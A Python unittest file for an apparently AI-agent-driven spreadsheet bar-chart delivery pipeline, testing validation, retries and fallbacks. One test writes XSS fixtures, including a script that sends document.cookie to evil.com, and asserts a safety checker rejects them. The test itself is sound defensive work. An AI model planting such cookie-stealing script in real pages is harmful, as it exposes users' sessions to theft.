"""Delivery regressions: stale HTML, real SVG/data acceptance, bounded repair and loop continuation."""
import io
import json
import os
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch
from contextlib import redirect_stdout
from xml.etree import ElementTree as ET

import openpyxl

from dsh_modules.spreadsheet_analysis import calculate_spreadsheet_analysis
from dsh_modules.spreadsheet_chart_delivery import SpreadsheetChartDelivery, chart_dataset, wants_standard_bar_chart
from dsh_modules.spreadsheet_chart_renderer import render_bar_chart, validate_bar_chart
from dsh_modules.telemetry import TelemetryStats
from dsh_modules.tool_result import ToolResult


class SpreadsheetChartDeliveryTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.source = self.root / 'source.xlsx'
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = '明细'
        ws.append(['部门名称', 'WBS编号', '金额(K)'])
        for row in [('甲<&', 'IK01', 20), ('甲<&', 'IK02', -5), ('乙', 'EX01', 100),
                    ('乙', 'IK03', -3), ('丙', 'IK04', 0)]:
            ws.append(row)
        wb.save(self.source)
        wb.close()
        self.prompt = '按部门统计金额合计，不包含WBS编号ex开头的数据，然后生成柱状图'
        self.receipt = calculate_spreadsheet_analysis(self.source, {'query': {
            'source': {'sheet': '明细', 'header_row': 1, 'data_range': 'A2:C6'},
            'where': {'field': 'WBS编号', 'op': 'not_starts_with', 'values': ['ex']},
            'group_by': ['部门名称'],
            'metrics': [{'id': 'amount', 'op': 'sum', 'field': '金额(K)'}]}})
        self.assertTrue(self.receipt.is_success, self.receipt.error)
        # Engine-only calculation has no model origin, but retains source hash/path.
        self.receipt.provenance['file_path'] = str(self.source)

    def test_stale_shared_html_never_used_or_overwritten_and_turns_are_unique(self):
        stale = self.root / 'index.html'
        stale.write_text('<html><body>old chart: 15</body></html>')
        os.utime(stale, (1, 1))
        paths = []
        for sid in ['same-session', 'same-session', 'another-session']:
            delivery = SpreadsheetChartDelivery(self.root, sid)
            self.assertTrue(delivery.publish(self.receipt, self.prompt, TelemetryStats()), delivery.error)
            manifest = json.loads((delivery.run_dir / 'manifest.json').read_text())
            self.assertEqual(manifest['transitions'],
                             ['calculating', 'calculated', 'generating', 'validating', 'validated', 'published'])
            self.assertTrue((delivery.run_dir / 'inputs/verified-data.json').exists())
            self.assertTrue((delivery.run_dir / 'outputs/index.html').exists())
            validate_bar_chart(delivery.published.read_text(), delivery.dataset)
            self.assertIn('甲&lt;&amp;', delivery.published.read_text())
            self.assertEqual([p['value'] for p in delivery.dataset['points']], ['15', '-3', '0'])
            self.assertIn('下载柱状图', delivery.presentation())
            paths.append(delivery.published)
        self.assertEqual(len(set(paths)), 3)
        self.assertEqual(stale.read_text(), '<html><body>old chart: 15</body></html>')

    def test_table_only_or_tampered_chart_cannot_pass_acceptance(self):
        dataset = chart_dataset(self.receipt, self.prompt)
        html = render_bar_chart(dataset)
        mutations = [html.replace('<rect ', '<not-a-bar '),
                     html.replace('height="250.', 'height="999.'),
                     html.replace('data-value="15"', 'data-value="999"'),
                     html.replace('<td>15</td>', '<td>999</td>')]
        # Explicit geometry mutation independent of scale rounding.
        import re
        mutations[1] = re.sub(r'height="[0-9.]+" fill=', 'height="999" fill=', html, count=1)
        for changed in mutations:
            with self.subTest():
                with self.assertRaises((ValueError, ET.ParseError)):
                    validate_bar_chart(changed, dataset)
        with self.assertRaises(ValueError):
            validate_bar_chart('<html><body><table/></body></html>', dataset)

    def test_retry_does_not_repeat_calculation_and_failure_does_not_publish(self):
        delivery = SpreadsheetChartDelivery(self.root, 'retry')
        real = render_bar_chart
        with patch('dsh_modules.spreadsheet_chart_delivery.render_bar_chart',
                   side_effect=[ValueError('temporary_render_error'), real(chart_dataset(self.receipt, self.prompt))]) as render:
            self.assertTrue(delivery.publish(self.receipt, self.prompt, TelemetryStats()), delivery.error)
            self.assertEqual(render.call_count, 2)
        failed = SpreadsheetChartDelivery(self.root, 'failed')
        with patch('dsh_modules.spreadsheet_chart_delivery.validate_bar_chart', side_effect=ValueError('bad_geometry')) as accept:
            self.assertFalse(failed.publish(self.receipt, self.prompt, TelemetryStats()))
            self.assertEqual(accept.call_count, 2)
        self.assertEqual(failed.outbound(), [])
        self.assertEqual(list(self.root.glob('chart-failed-*.html')), [])
        self.assertNotIn('已生成', failed.presentation())
        self.assertEqual(failed.state['status'], 'failed')

    def test_source_change_and_publish_tamper_fail_closed(self):
        delivery = SpreadsheetChartDelivery(self.root, 'source-change')
        self.source.write_bytes(b'changed')
        self.assertFalse(delivery.publish(self.receipt, self.prompt, TelemetryStats()))
        self.assertEqual(delivery.outbound(), [])

    def test_incomplete_evidence_is_not_chart_ready_even_if_clarification_can_finish(self):
        from dsh_modules.spreadsheet_chart_delivery import verified_chart_receipt
        with patch('dsh_modules.analysis_task_state.analysis_task_state', return_value={
                'complete': False, 'gate_review': {'action': 'clarify'}}):
            self.assertIsNone(verified_chart_receipt([self.receipt], self.prompt))

    def test_old_index_does_not_satisfy_legacy_completion_evaluator(self):
        from dsh_modules.completion_evaluator import evaluate_tool_execution_turn
        stale = self.root / 'index.html'
        stale.write_text(render_bar_chart(chart_dataset(self.receipt, self.prompt)))
        os.utime(stale, (1, 1))
        import time
        turn = type('Turn', (), {'may_finish': lambda *a, **k: True})()
        with patch('dsh_modules.completion_evaluator.detect_missing_requested_deliverable', return_value='.html'):
            finish, transition, _ = evaluate_tool_execution_turn(
                turn, [self.receipt], [], None, None, True, [], '', 0, 2, 10,
                last_user_prompt=self.prompt, expected_deliverables=['.html'],
                start_ts=time.time(), workspace_dir=str(self.root))
        self.assertFalse(finish)
        self.assertIn('交付阶段', transition)

    def test_loop_repairs_query_then_renders_without_model_html_or_shared_scan(self):
        from dsh_modules import agent_loop
        from dsh_modules.runtime_policy import RuntimePolicy
        from dsh_modules.tools import get_sandbox_tools
        replies = [{'content': '', 'tool_calls': [{'id': str(i), 'type': 'function', 'function': {
                    'name': 'aggregate_spreadsheet', 'arguments': '{}'}}]} for i in range(2)]
        counter = []
        def dispatch(*args, **kwargs):
            receipt = (ToolResult.error('invalid_analysis_plan', 'query must be object',
                       provenance={'tool': 'aggregate_spreadsheet'}) if not counter else self.receipt)
            kwargs['execution_evidence'].append(receipt)
            counter.append(receipt)
            return False
        def may_finish(_, evidence, **kwargs):
            return bool(evidence and evidence[-1].is_success)
        with patch.object(agent_loop, 'WORKSPACE_DIR', str(self.root)), \
             patch.object(agent_loop, 'call_model_proxy', side_effect=replies) as model, \
             patch.object(agent_loop, '_dispatch_tool_calls', side_effect=dispatch), \
             patch('dsh_modules.analysis_task_state.analysis_task_state', side_effect=lambda evidence, *a, **k: {'complete': may_finish(None, evidence), 'evidence_ids': [self.receipt.data['evidence_id']]}), \
             patch.object(agent_loop, 'evaluate_tool_execution_turn', return_value=(False, None, 3)), \
             patch.object(agent_loop, '_finalize_agent_text', side_effect=AssertionError('no free-text finalizer')), \
             redirect_stdout(io.StringIO()):
            result = agent_loop.run_agent_loop([{'role': 'system', 'content': ''}, {'role': 'user', 'content': self.prompt}],
                       model='test', policy=RuntimePolicy(), max_rounds=3, tools=get_sandbox_tools(),
                       spreadsheet_analysis_required=True, is_generate_intent=True,
                       user_prompt=self.prompt, delivery_session_id='loop-test')
        self.assertEqual(model.call_count, 2)
        self.assertEqual(len(result.outbound_files), 1)
        self.assertIn('柱状图已生成', result.final_text)
        self.assertFalse((self.root / 'index.html').exists())
        for call in model.call_args_list:
            self.assertNotIn('bash', {t['function']['name'] for t in call.kwargs['tools']})

    def test_failed_delivery_cannot_be_recovered_as_success_by_outer_exporter(self):
        from dsh_modules.artifact_exporter import ArtifactExporter
        from dsh_modules.html_report_fallback import materialize_requested_html
        warning = '> ⚠️ **【重要提示：目标交付物尚未生成落盘】**\n\n' + '|部门|金额|\n|---|---|\n|甲|15|\n' * 10
        (self.root / 'index.html').write_text(render_bar_chart(chart_dataset(self.receipt, self.prompt)))
        self.assertEqual(ArtifactExporter.export_html(warning, False, str(self.root), prompt=self.prompt), (warning, []))
        self.assertEqual(materialize_requested_html(self.prompt, warning, str(self.root), is_design_intent=True), (None, False))

    def test_route_does_not_capture_excel_or_negated_chart_requests(self):
        self.assertTrue(wants_standard_bar_chart(self.prompt))
        self.assertFalse(wants_standard_bar_chart('按部门统计金额，不要生成柱状图'))
        self.assertFalse(wants_standard_bar_chart('生成Excel柱状图'))
        self.assertTrue(wants_standard_bar_chart('根据 source.xlsx 统计金额，然后生成柱状图'))
        self.assertTrue(wants_standard_bar_chart('使用Excel数据按部门统计金额，然后生成柱状图'))

    def test_sole_spreadsheet_attachment_inferred_when_filepath_empty(self):
        from dsh_modules.spreadsheet_context import resolve_session_attachment
        with patch.dict(os.environ, {"DSH_SESSION_ATTACHMENTS": self.source.name}):
            with patch('dsh_modules.config.WORKSPACE_DIR', str(self.root)):
                res, err = resolve_session_attachment("", "测试")
                self.assertIsNone(err)
                self.assertEqual(res, self.source.resolve())

    def test_multiple_attachments_require_explicit_filepath(self):
        from dsh_modules.spreadsheet_context import resolve_session_attachment
        other = self.root / 'other.xlsx'
        other.write_text('dummy')
        with patch.dict(os.environ, {"DSH_SESSION_ATTACHMENTS": f"{self.source.name},{other.name}"}):
            with patch('dsh_modules.config.WORKSPACE_DIR', str(self.root)):
                res, err = resolve_session_attachment("", "测试")
                self.assertIsNone(res)
                self.assertTrue(err.is_error)
                self.assertEqual(err.error_code, "source_unavailable")
                self.assertIn("当前可用附件", err.error_message)

    def test_cross_check_with_scripts_matching_and_mismatch(self):
        from dsh_modules.spreadsheet_chart_workflow import cross_check_with_scripts
        dataset = {
            'points': [
                {'label': '華東MIS', 'value': '561.75345'},
                {'label': '華東BAS', 'value': '260.64793'}
            ]
        }
        bash_stdout = (
            "=== 按部门统计的金额合计 ===\n"
            "   華東MIS 561.75345   91\n"
            "   華東BAS 260.64793   40\n"
        )
        ev_match = [ToolResult.success(bash_stdout, provenance={'tool': 'bash'})]
        res = cross_check_with_scripts(dataset, ev_match)
        self.assertEqual(res['status'], 'match')
        self.assertEqual(res['found'], 2)
        self.assertEqual(res['mismatched'], [])

        bash_stdout_mismatch = (
            "=== 按部门统计的金额合计 ===\n"
            "   華東MIS 561.75345   91\n"
            "   華東BAS 999.00000   40\n"
        )
        ev_mismatch = [ToolResult.success(bash_stdout_mismatch, provenance={'tool': 'bash'})]
        res = cross_check_with_scripts(dataset, ev_mismatch)
        self.assertEqual(res['status'], 'mismatch')
        self.assertEqual(res['mismatched'], ['華東BAS'])

    def test_failure_presentation_includes_reasons_and_preserves_reply_without_html(self):
        from dsh_modules.spreadsheet_chart_workflow import failure_presentation
        delivery = SpreadsheetChartDelivery(self.root, 'failure-test')
        delivery.fail('verified_chart_data_unavailable_within_budget', TelemetryStats())
        ev = [
            ToolResult.error('source_unavailable', '未指定有效文件路径', provenance={'tool': 'aggregate_spreadsheet'}),
            ToolResult.success("数据统计完成，华东MIS为561.75", provenance={'tool': 'bash'})
        ]
        reply_with_html = "建议核实参数。\n```html\n<!DOCTYPE html><html><body>图表</body></html>\n```\n祝工作顺利！"
        output = failure_presentation(delivery, ev, reply_with_html)
        self.assertIn("柱状图尚未完成交付", output)
        self.assertIn("原因：", output)
        self.assertIn("缺少或写错了文件路径参数", output)
        self.assertIn("脚本产物不经运行时核验", output)
        self.assertIn("模型说明：", output)
        self.assertIn("建议核实参数", output)
        self.assertNotIn("<!DOCTYPE html>", output)
        self.assertNotIn("```html", output)
        self.assertIn("建议：", output)

    def test_chart_mode_prevents_bash_fallback_on_consecutive_errors(self):
        from dsh_modules import agent_loop
        from dsh_modules.runtime_policy import RuntimePolicy
        from dsh_modules.tools import get_sandbox_tools
        replies = [
            {'content': '', 'tool_calls': [{'id': 'call_1', 'type': 'function', 'function': {
                'name': 'aggregate_spreadsheet', 'arguments': '{}'}}]},
            {'content': '', 'tool_calls': [{'id': 'call_2', 'type': 'function', 'function': {
                'name': 'aggregate_spreadsheet', 'arguments': '{}'}}]},
            {'content': '', 'tool_calls': [{'id': 'call_3', 'type': 'function', 'function': {
                'name': 'aggregate_spreadsheet', 'arguments': '{}'}}]},
            # 循环耗尽后 salvage 阶段的回复（放弃或继续失败）
            {'content': '未能完成核算', 'tool_calls': []},
            {'content': '未能完成核算', 'tool_calls': []},
        ]
        def dispatch(*args, **kwargs):
            receipt = ToolResult.error('source_unavailable', '未指定有效文件路径', provenance={'tool': 'aggregate_spreadsheet'})
            kwargs['execution_evidence'].append(receipt)
            return False

        with patch.object(agent_loop, 'WORKSPACE_DIR', str(self.root)), \
             patch.object(agent_loop, 'MAX_AGENT_ROUNDS_HARD_CEILING', 3), \
             patch.object(agent_loop, 'MAX_SPREADSHEET_ROUNDS_CEILING', 3), \
             patch.object(agent_loop, 'call_model_proxy', side_effect=replies) as mock_model, \
             patch.object(agent_loop, '_dispatch_tool_calls', side_effect=dispatch), \
             patch('dsh_modules.analysis_task_state.analysis_task_state', return_value={'complete': False}), \
             patch.object(agent_loop, 'evaluate_tool_execution_turn', return_value=(False, None, 3)), \
             redirect_stdout(io.StringIO()):
            result = agent_loop.run_agent_loop(
                [{'role': 'system', 'content': ''}, {'role': 'user', 'content': self.prompt}],
                model='test', policy=RuntimePolicy(), max_rounds=3, tools=get_sandbox_tools(),
                spreadsheet_analysis_required=True, is_generate_intent=True,
                user_prompt=self.prompt, delivery_session_id='chart-no-bash-test'
            )
        for call in mock_model.call_args_list:
            tools_in_call = {t['function']['name'] for t in call.kwargs['tools']}
            self.assertNotIn('bash', tools_in_call)
        self.assertIn("柱状图尚未完成交付", result.final_text)
        self.assertIn("原因：", result.final_text)

    def test_salvage_chart_delivery_rescues_unverified_loop(self):
        from dsh_modules import agent_loop
        from dsh_modules.runtime_policy import RuntimePolicy
        from dsh_modules.tools import get_sandbox_tools
        # 前两轮模型因错误未产出 verified receipt；在第二轮后进入 salvage，模型输出有效 aggregate 调用
        loop_replies = [
            {'content': '', 'tool_calls': [{'id': 'c1', 'type': 'function', 'function': {
                'name': 'aggregate_spreadsheet', 'arguments': '{}'}}]},
            {'content': '', 'tool_calls': [{'id': 'c2', 'type': 'function', 'function': {
                'name': 'aggregate_spreadsheet', 'arguments': '{}'}}]},
        ]
        salvage_reply = {
            'content': '', 'tool_calls': [{'id': 'salvage_1', 'type': 'function', 'function': {
                'name': 'aggregate_spreadsheet', 'arguments': '{"file_path":"/workspace/source.xlsx"}'}}]}
        all_replies = loop_replies + [salvage_reply]

        def dispatch(*args, **kwargs):
            calls = kwargs.get('structured_calls', [])
            for c in calls:
                if c.get('id') == 'salvage_1':
                    kwargs['execution_evidence'].append(self.receipt)
                else:
                    kwargs['execution_evidence'].append(
                        ToolResult.error('source_unavailable', '未指定有效文件路径', provenance={'tool': 'aggregate_spreadsheet'}))
            return False

        def mock_analysis_state(evidence, *a, **k):
            has_success = any(getattr(e, 'is_success', False) for e in evidence)
            return {'complete': has_success, 'evidence_ids': [self.receipt.data['evidence_id']] if has_success else []}

        with patch.object(agent_loop, 'WORKSPACE_DIR', str(self.root)), \
             patch.object(agent_loop, 'MAX_AGENT_ROUNDS_HARD_CEILING', 2), \
             patch.object(agent_loop, 'MAX_SPREADSHEET_ROUNDS_CEILING', 2), \
             patch.object(agent_loop, 'call_model_proxy', side_effect=all_replies) as mock_model, \
             patch.object(agent_loop, '_dispatch_tool_calls', side_effect=dispatch), \
             patch('dsh_modules.analysis_task_state.analysis_task_state', side_effect=mock_analysis_state), \
             patch.object(agent_loop, 'evaluate_tool_execution_turn', return_value=(False, None, 2)), \
             redirect_stdout(io.StringIO()):
            result = agent_loop.run_agent_loop(
                [{'role': 'system', 'content': ''}, {'role': 'user', 'content': self.prompt}],
                model='test', policy=RuntimePolicy(), max_rounds=2, tools=get_sandbox_tools(),
                spreadsheet_analysis_required=True, is_generate_intent=True,
                user_prompt=self.prompt, delivery_session_id='salvage-test'
            )
        self.assertIn("柱状图已生成", result.final_text)
        self.assertEqual(len(result.outbound_files), 1)
        purposes = [c.kwargs.get('purpose') for c in mock_model.call_args_list]
        self.assertIn('chart_salvage', purposes)

    def test_is_safe_unverified_html_rejects_xss_and_external_resources(self):
        from dsh_modules.spreadsheet_chart_workflow import is_safe_unverified_html
        safe_file = self.root / 'safe.html'
        safe_file.write_text('<html><head><style>h1{color:blue}</style></head><body><h1>柱状图</h1><svg><rect width="10" height="20"/></svg></body></html>')
        self.assertTrue(is_safe_unverified_html(safe_file))

        # 带有外部 script 的
        unsafe_1 = self.root / 'unsafe_1.html'
        unsafe_1.write_text('<html><head><script src="https://evil.com/xss.js"></script></head><body></body></html>')
        self.assertFalse(is_safe_unverified_html(unsafe_1))

        # 带有 onclick 事件的
        unsafe_2 = self.root / 'unsafe_2.html'
        unsafe_2.write_text('<html><body><div onclick="doEvil()">点击</div></body></html>')
        self.assertFalse(is_safe_unverified_html(unsafe_2))

        # 带有 iframe 的
        unsafe_3 = self.root / 'unsafe_3.html'
        unsafe_3.write_text('<html><body><iframe src="http://evil.com"></iframe></body></html>')
        self.assertFalse(is_safe_unverified_html(unsafe_3))

        # 带有高危 JS API 的
        unsafe_4 = self.root / 'unsafe_4.html'
        unsafe_4.write_text('<html><body><script>fetch("http://evil.com?c=" + document.cookie)</script></body></html>')
        self.assertFalse(is_safe_unverified_html(unsafe_4))

    def test_p2_unverified_fallback_disabled_by_default(self):
        from dsh_modules import agent_loop
        from dsh_modules.runtime_policy import RuntimePolicy
        from dsh_modules.tools import get_sandbox_tools
        # 工作区有一个本轮生成的有效 HTML 柱状图
        bash_html = self.root / '部门金额柱状图.html'
        bash_html.write_text('<html><body><h1>部门金额柱状图</h1><svg><rect width="100" height="50"/></svg></body></html>')

        replies = [
            {'content': '', 'tool_calls': [{'id': 'c1', 'type': 'function', 'function': {'name': 'aggregate_spreadsheet', 'arguments': '{}'}}]},
            {'content': '未能完成核算', 'tool_calls': []},
            {'content': '未能完成核算', 'tool_calls': []},
        ]
        def dispatch(*args, **kwargs):
            kwargs['execution_evidence'].append(
                ToolResult.error('source_unavailable', '未指定有效文件路径', provenance={'tool': 'aggregate_spreadsheet'}))
            return False

        policy = RuntimePolicy()
        self.assertFalse(policy.allow_unverified_chart_fallback)

        with patch.object(agent_loop, 'WORKSPACE_DIR', str(self.root)), \
             patch.object(agent_loop, 'MAX_AGENT_ROUNDS_HARD_CEILING', 1), \
             patch.object(agent_loop, 'MAX_SPREADSHEET_ROUNDS_CEILING', 1), \
             patch.object(agent_loop, 'call_model_proxy', side_effect=replies), \
             patch.object(agent_loop, '_dispatch_tool_calls', side_effect=dispatch), \
             patch('dsh_modules.analysis_task_state.analysis_task_state', return_value={'complete': False}), \
             patch.object(agent_loop, 'evaluate_tool_execution_turn', return_value=(False, None, 1)), \
             redirect_stdout(io.StringIO()):
            result = agent_loop.run_agent_loop(
                [{'role': 'system', 'content': ''}, {'role': 'user', 'content': self.prompt}],
                model='test', policy=policy, max_rounds=1, tools=get_sandbox_tools(),
                spreadsheet_analysis_required=True, is_generate_intent=True,
                user_prompt=self.prompt, delivery_session_id='p2-default-disabled-test'
            )
        # 默认关闭：不导出未核验产物
        self.assertEqual(result.outbound_files, [])
        self.assertNotIn('未核验图表文件已降级交付', result.final_text)

    def test_p2_unverified_fallback_when_enabled_materializes_downloadable_file(self):
        from dsh_modules import agent_loop
        from dsh_modules.runtime_policy import RuntimePolicy
        from dsh_modules.tools import get_sandbox_tools
        # 工作区有一个本轮生成的安全 HTML 柱状图
        bash_html = self.root / '部门金额柱状图.html'
        bash_html.write_text('<html><body><h1>部门金额柱状图</h1><svg><rect width="100" height="50"/></svg></body></html>')

        replies = [
            {'content': '', 'tool_calls': [{'id': 'c1', 'type': 'function', 'function': {'name': 'aggregate_spreadsheet', 'arguments': '{}'}}]},
            {'content': '未能完成核算', 'tool_calls': []},
            {'content': '未能完成核算', 'tool_calls': []},
        ]
        def dispatch(*args, **kwargs):
            kwargs['execution_evidence'].append(
                ToolResult.error('source_unavailable', '未指定有效文件路径', provenance={'tool': 'aggregate_spreadsheet'}))
            return False

        policy = RuntimePolicy()
        policy.allow_unverified_chart_fallback = True

        with patch.object(agent_loop, 'WORKSPACE_DIR', str(self.root)), \
             patch.object(agent_loop, 'MAX_AGENT_ROUNDS_HARD_CEILING', 1), \
             patch.object(agent_loop, 'MAX_SPREADSHEET_ROUNDS_CEILING', 1), \
             patch.object(agent_loop, 'call_model_proxy', side_effect=replies), \
             patch.object(agent_loop, '_dispatch_tool_calls', side_effect=dispatch), \
             patch('dsh_modules.analysis_task_state.analysis_task_state', return_value={'complete': False}), \
             patch.object(agent_loop, 'evaluate_tool_execution_turn', return_value=(False, None, 1)), \
             redirect_stdout(io.StringIO()):
            result = agent_loop.run_agent_loop(
                [{'role': 'system', 'content': ''}, {'role': 'user', 'content': self.prompt}],
                model='test', policy=policy, max_rounds=1, tools=get_sandbox_tools(),
                spreadsheet_analysis_required=True, is_generate_intent=True,
                user_prompt=self.prompt, delivery_session_id='p2-enabled-test'
            )
        # 开启后：成功导出未核验产物
        self.assertEqual(len(result.outbound_files), 1)
        out_info = json.loads(result.outbound_files[0])
        self.assertTrue(out_info.get('unverified'))
        self.assertIn('unverified-chart-p2-enabled-test', out_info.get('fileName'))
        self.assertTrue(Path(out_info['filePath']).exists())
        # 正文中带下载链接与明确警示
        self.assertIn('未核验图表文件已降级交付', result.final_text)
        self.assertIn('下载未核验图表', result.final_text)
        self.assertNotIn('```html', result.final_text)


if __name__ == '__main__':
    unittest.main()
